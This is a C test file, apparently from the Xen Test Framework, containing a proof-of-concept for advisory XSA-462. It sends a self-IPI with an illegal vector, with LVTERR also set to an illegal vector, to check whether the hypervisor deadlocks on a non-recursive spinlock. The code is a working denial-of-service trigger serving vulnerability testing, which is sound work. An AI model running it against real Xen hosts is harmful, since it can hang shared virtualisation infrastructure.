/**
 * @file tests/xsa-462/main.c
 * @ref test-xsa-462
 *
 * @page test-xsa-462 XSA-462
 *
 * Advisory: [XSA-462](https://xenbits.xen.org/xsa/advisory-462.html)
 *
 * In the APIC error model, it's possible for the delivery of an error to
 * trigger a subsequent error.  While the logic in Xen was written to avoid
 * unbound recursion, state was protected by a non-recursive spinlock which
 * can be forced to deadlock in this case.
 *
 * @see tests/xsa-462/main.c
 */

#define TEST_APIC_MODE APIC_MODE_XAPIC

#include <xtf.h>

const char test_title[] = "XSA-462 PoC";

/* apic_icr_write() using FEP */
static void apic_icr_force_write(uint64_t val)
{
    if ( CUR_APIC_MODE == APIC_MODE_XAPIC )
    {
        apic_mmio_write(APIC_ICR2, (uint32_t)(val >> 32));

        asm volatile (_ASM_XEN_FEP "movl %[val], %[ptr]"
                      : [ptr] "+m" (*(uint32_t *)(_p(APIC_DEFAULT_BASE) + APIC_ICR))
                      : [val] "ri" ((uint32_t)val));
    }
    else
        asm volatile (_ASM_XEN_FEP "wrmsr" ::
                      "a" ((uint32_t)val), "d" ((uint32_t)(val >> 32)),
                      "c" (MSR_X2APIC_REGS + (APIC_ICR >> 4)));
}

void test_main(void)
{
    uint32_t esr;
    int rc;

    if ( !xtf_has_fep )
        xtf_skip("FEP support not detected - test not reliable\n");

    if ( (rc = apic_init(APIC_MODE_XAPIC)) < 0 )
        return xtf_error("Error: apic_init(xAPIC) %d\n", rc);

    /*
     * Set up the APIC.  Clear ESR, and set up LVTERR with an illegal vector.
     */
    apic_write(APIC_ESR, 0);
    apic_write(APIC_LVTERR, 0xf);

    /*
     * Send a IPI with an illegal vector to ourselves.
     *
     * For non-FEP, this is intentionally not DEST_SELF to reduce the chance
     * that it's accelerated by APICV/AVIC.  This also assumes that vCPU0's
     * APIC_ID is 0, which happens to have always been true in Xen.  FEP
     * follows suit for consistency.
     *
     * This generates a Send Illegal Vector, which triggers a interrupt
     * through LVTERR.  Doing so further generates a Receive Illegal Vector,
     * which may deadlock Xen.
     */
    if ( xtf_has_fep )
        apic_icr_force_write(APIC_DM_FIXED | 0xf);
    else
        apic_icr_write(APIC_DM_FIXED | 0xf);

    /*
     * At this point, if Xen is still alive, it didn't deadlock.
     *
     * Check that ESR matches expectations.
     */
    apic_write(APIC_ESR, 0);
    esr = apic_read(APIC_ESR);

    if ( esr != (APIC_SIV | APIC_RIV) )
        return xtf_error("Error: ESR expected %#x, got %#x\n",
                         (APIC_SIV | APIC_RIV), esr);

    xtf_success("Success: %s vulnerable to XSA-462\n",
                xtf_has_fep ? "Not" : "Probably not");
}

/*
 * Local variables:
 * mode: C
 * c-file-style: "BSD"
 * c-basic-offset: 4
 * tab-width: 4
 * indent-tabs-mode: nil
 * End:
 */
